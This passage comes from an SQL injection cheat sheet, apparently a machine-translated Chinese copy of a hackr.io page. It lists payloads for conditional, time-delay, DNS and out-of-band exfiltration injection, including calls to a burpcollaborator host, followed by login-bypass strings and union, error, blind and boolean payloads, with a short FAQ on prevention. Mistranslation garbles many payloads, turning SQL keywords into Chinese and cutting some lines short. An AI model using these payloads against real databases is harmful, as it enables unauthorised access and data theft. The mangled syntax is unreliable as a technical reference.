<p class="c2"><span class="c1"> MySQL </span>的实现</p>
</td>
<td class="c24" colspan="1" rowspan="1">
<p class="c2"><span class="c1">选择IF(YOUR-CONDITION-HERE，(SELECT table _ name FROM information _ schema . tables)，‘a’)</span></p>
</td>
</tr>
</tbody>
</table>
<h3 id="h-umy1m4uegc0i" class="c12"><span class="c10 c25">时间延迟</span></h3>
<p class="c2">该命令在处理查询时创建了一个<span class="c1">时间延迟。</span></p>
<table class="c20">
<tbody>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">甲骨文</span></p>
</td>
<td class="c37" colspan="1" rowspan="1">
<p class="c2"><span class="c1">DBMS _ pipe . receive _ message((' a ')，10) </span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">微软</span></p>
</td>
<td class="c37" colspan="1" rowspan="1">
<p class="c2"><span class="c1">等待延迟‘0:0:10’</span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> PostgreSQL </span></p>
</td>
<td class="c37" colspan="1" rowspan="1">
<p class="c2"><span class="c1">选择pg_sleep(10) </span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> MySQL </span>的实现</p>
</td>
<td class="c51" colspan="1" rowspan="1">
<p class="c2"><span class="c1">选择睡眠(10) </span></p>
</td>
</tr>
</tbody>
</table>
<h3 id="h-gg78x7vyyqff" class="c12"><span class="c25 c10"> DNS查找</span></h3>
<p class="c2">该命令帮助您对外部域执行<span class="c1">DNS查找。</span></p>
<table class="c20">
<tbody>
<tr class="c26">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">甲骨文</span></p>
</td>
<td class="c41" colspan="1" rowspan="1">
<p class="c2">以下技术利用XML外部实体(XXE)漏洞来触发DNS查找。</p>
<p class="c2"><span class="c1">选择extract value(xmltype(&lt;？xml版本="1.0 "编码="UTF-8 "？&gt; &lt;！DOCTYPE根[ &lt;！ENTITY % remote SYSTEM " http://YOUR-SUBDOMAIN-here . burpcollaborator . net/"&gt;% remote；] &gt;')，'/l ')来自对偶</span></p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1">微软</span></p>
</td>
<td class="c48" colspan="1" rowspan="1">
<p class="c2">执行主管..XP _ dirtree '//YOUR-SUBDOMAIN-here . burpcollaborator . net/a '</p>
</td>
</tr>
<tr class="c34">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> PostgreSQL </span></p>
</td>
<td class="c48" colspan="1" rowspan="1">
<p class="c2"><span class="c1">复制(选择'')到程序‘nslookup YOUR-SUBDOMAIN-here . burpcollaborator . net’</span></p>
</td>
</tr>
<tr class="c32">
<td class="c21" colspan="1" rowspan="1">
<p class="c2"><span class="c1"> MySQL </span>的实现</p>
</td>
<td class="c48" colspan="1" rowspan="1">
<p class="c2"><span class="c1">以下技术仅适用于Windows:</span></p>
<p class="c2"><span class="c1">LOAD _ FILE(' \ \ \ \ YOUR-SUBDOMAIN-here . burpcollaborator . net \ \ a ')</span></p>
<p class="c2"><span class="c1">选择...INTO OUTFILE ' \ \ \ \ YOUR-SUBDOMAIN-here . burpcollaborator . net \ a '</span></p>
</td>
</tr>
</tbody>
</table>
<h2 id="h-2vdhadfsibs1" class="c30"><span class="c28 c10">结论</span></h2>
<p class="c2">SQL注入是非法的，但是学习如何运行所有可能的SQL注入攻击是测试你网站安全性的一个很好的方法。</p>
<p class="c2">您可以使用不同的方法来应对SQL注入攻击，以检查网站的完整性和安全性。因此，您需要深入了解SQL，以便在内部实施这种攻击。这个SQL注入小抄将帮助你理解你可以在你的网站上测试什么类型的场景。</p>
<p class="c2">有兴趣了解更多关于SQL的知识吗？查看我们的<span class="c39"> <a class="c18" href="https://hackr.io/tutorials/learn-sql">最佳SQL教程列表</a> </span> <span class="c1">！</span></p>
<h2 id="h-98kf8klsnt3t" class="c30"><span class="c28 c10">常见问题解答</span></h2>
<h4 id="h-q5cdnqvxgrib"><span class="c25 c10"> 1。什么是SQL注入备忘单？</span></h4>
<p class="c2">SQL注入附带了所有必要的信息、查询和语法，将帮助您了解如何利用SQL数据库的漏洞。这些方法可能因版本和数据库而异。</p>
<h4 id="h-c33lohtkd6j0"><span class="c25 c10"> 2。SQL注入攻击的例子有哪些？</span></h4>
<p class="c2"><span class="c1">下面是一些<a href="https://hackr.io/blog/top-sql-interview-questions#:~:text=40.%20What%20is%20SQL%20injection%3F"> SQL注入</a>攻击的例子:</span></p>
<p class="c2"><span class="c10">绕过登录:</span> <span class="c1">包含潜在SQL漏洞的登录屏幕和表单可以使用各种SQLi绕过。</span></p>
<ul class="c4 lst-kix_jfev6gm0j1vu-0 start">
<li class="c2 c19 li-bullet-0"><span class="c1">管理员' # </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">管理员“# </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1"> admin')) # </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">'或1=1 - + </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">'或1=1 # </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">或</span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">"或真- </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">"或true - + </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">’))还是真————</span></li>
<li class="c2 c19 li-bullet-0"><span class="c1"> admin '或1=1或' ' =' </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1"> admin ')或(' 1'='1' - </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1"> admin ')或‘1 ' =‘1 '/*</span></li>
<li class="c2 c19 li-bullet-0"><span class="c1"> admin ")或" 1"="1 </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">')或(' 1 ' = ' 1-</span></li>
</ul>
<p class="c2"><span class="c10">基于Union:</span>您可以执行一个或多个查询，并使用Union关键字在MySQL中将它们的结果附加到原始查询中。</p>
<ul class="c4 lst-kix_jfev6gm0j1vu-0">
<li class="c2 c19 li-bullet-0"><span class="c1">'顺序按1，睡眠(10)+</span></li>
<li class="c2 c19 li-bullet-0"><span class="c1">'工会选择@ @版本，睡眠(10)，3 - + </span></li>
<li class="c2 c19 li-bullet-0"><span class="c1"> ' union select @@version，sleep(10)，3，“' 3 '”#-+</span></li>
</ul>
<p class="c2">使用information_schema.column中的<span class="c1"> ' union select 1，group_concat(column_name)，3来获取列名。</span></p>
<p class="c2"><span class="c10">基于错误:</span> <span class="c1">您可以实现计数、下限和分组函数来生成错误。如果MySQL没有使用基于联合的查询显示输出，您可以使用这些函数。</span></p>
<p class="c2"><span class="c1"> (select count(*)，concat(0x3a，0x3a，(select database())，0x3a，0x3a，floor(rand()* 2))a from information _ schema . columns group by a)</span></p>
<p class="c2"><span class="c1">枚举数据库，</span></p>
<p class="c2"><span class="c1">'和(select 1 from (select count(*)，concat(0x3a，0x3a，(select database())，0x3 </span></p>
<p class="c2"><span class="c10">盲:</span> <span class="c1">在盲SQLi中，我们永远无法确定页面上是否存在注入。所以，我们需要用其他技术。</span></p>
<p class="c2"><span class="c40 c10">如果基于其他:</span></p>
<p class="c2"><span class="c1">'和if((select database())= ' security '，sleep(10)，null) - + </span></p>
<p class="c2"><span class="c1">'和if((select substr(table_name，1，1)from information _ schema . tables其中table_schema=database() limit 0，1)='e '，sleep(10)，null) - + </span></p>
<p class="c2"><span class="c40 c10">基于睡眠:</span></p>
<p class="c2"><span class="c1">'和睡眠(10) - + </span></p>
<p class="c2"><span class="c1">’；等待延迟' 0:0:10' - + </span></p>
<p class="c2"><span class="c1">’))；等待延迟' 0:0:10' - + </span></p>
<p class="c2"><span class="c1">"和睡眠(10) - + </span></p>
<p class="c2"><span class="c40 c10">基于布尔:</span></p>
<p class="c2"><span class="c1">和1 &gt; 2 - + </span></p>
<p class="c2"><span class="c1">'和1=1 - + </span></p>
<p class="c2"><span class="c1">'和(ascii(substr(database()，1，1))) &lt; 114 - + </span></p>
<p class="c2"><span class="c1">和(ascii(substr((select column from information _ schema . columns其中t </span></p>
<p class="c2"><span class="c10">带外:</span> <span class="c1">当结果有限时，我们需要选择另一个渠道来注入所需的信息。</span></p>
<p class="c2"><span class="c1">选择@@version进入outfile '////127 . 0 . 0 . 1/tmp/results . txt '；</span></p>
<p class="c2"><span class="c1">选择load_file(concat('\\\\ '，database()，'。&lt;own _ site&gt;/tmp/result . txt’)；</span></p>
<h4 id="h-e4w01htdt8fw"><span class="c25 c10"> 3。什么是基本SQL注入？</span></h4>
<p class="c2"><span class="c1"> SQL注入是最常见的网络攻击之一。攻击者可以通过注入恶意代码和破坏数据的完整性来改变存储在数据库中的信息。</span></p>
<h4 id="h-qhlmk0atmthj"><span class="c25 c10"> 4。SQL注入违法吗？</span></h4>
<p class="c2">是的，SQL注入是非法的，因为它让网络攻击者可以在用户不知情的情况下访问数据库中的关键私人信息。黑客可以使用不同的方法实施这种攻击，如本备忘单所述。</p>
<h4 id="h-905ou23u2u4j"><span class="c25 c10"> 5。如何防止SQL注入？</span></h4>
<p class="c2">当软件开发人员创建需要用户输入的动态数据库查询时，就会发生SQL注入。</p>
<p class="c2">为了避免SQL注入攻击，开发人员要么停止编写动态查询，要么实施更强的安全措施来保护用户信息和输入。</p>
<p class="c2"><span class="c1">下面是一些预防SQL注入的方法:</span></p>
<ul class="c4 lst-kix_z9gif0ftsbnu-0 start">
<li class="c2 c8 li-bullet-0"><span class="c1">使用参数化查询的预准备语句的使用</span></li>
<li class="c2 c8 li-bullet-0"><span class="c1">存储过程</span></li>
<li class="c2 c8 li-bullet-0"><span class="c1">用户输入的验证</span></li>
<li class="c2 c8 li-bullet-0"><span class="c1">转义所有用户提供的输入</span></li>
<li class="c2 c8 li-bullet-0"><span class="c1"> <span class="c1">强制执行最小权限</span> </span></li>
</ul>
<p class="c2"><strong> <span class="c10 c40">人也在读书:</span> </strong></p>


									</div>

									</div>    
</body>
</html>